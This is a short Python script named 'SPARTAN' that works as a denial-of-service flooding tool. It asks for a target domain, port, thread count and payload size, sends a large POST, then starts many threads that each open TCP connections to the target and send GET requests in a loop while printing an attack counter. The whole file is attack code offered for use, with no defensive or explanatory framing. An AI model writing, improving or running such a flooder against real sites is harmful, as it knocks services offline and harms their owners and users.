import socket
import threading
import requests
import sys


print("SPARTAN")
print("a spartan's greatest shame was coming back alive after a lost battle")
print("_______________________________________________________________________________")
target = input("Enter a domain(website name): ")
port = input("Enter port: ")
amount = int(input("How many requests do you want to send? "))
payload_size = int(input("Enter the payload size in bytes: "))
print("_______________________________________________________________________________")






terminate_event = threading.Event()  

def resolve_target(target):
    try:
        ip_address = socket.gethostbyname(target)
        print(f"The IP address of {target} is: {ip_address}")
        return ip_address  
    except socket.gaierror:
        print(f"Failed to resolve {target}")
        return None  

def check_website(url, size):
    try:
        payload = 'a' * size  
        headers = {'Content-Length': str(len(payload))}
        response = requests.post(url, data=payload, headers=headers)
        if response.status_code == 200:

            pass
        else:

            pass
    except requests.exceptions.RequestException as e:

        pass

def attack():
    while not terminate_event.is_set():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, int(port)))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, int(port)))
        
        global attack_num
        attack_num += 1
        sys.stdout.write('\r' + str(attack_num))
        sys.stdout.flush()
        
        s.close()

attack_num = 0

resolved_target = resolve_target(target)
if resolved_target is None:
    print("Invalid target. Exiting...")
    exit()

check_website(f"http://{target}:{port}", payload_size)

for i in range(amount):
    thread = threading.Thread(target=attack)
    thread.start()

def terminate_attack():
    terminate_event.set()


thread.join()




terminate = input("Press 'T' to terminate the attack: ")
if terminate.lower() == 't':
    terminate_attack()
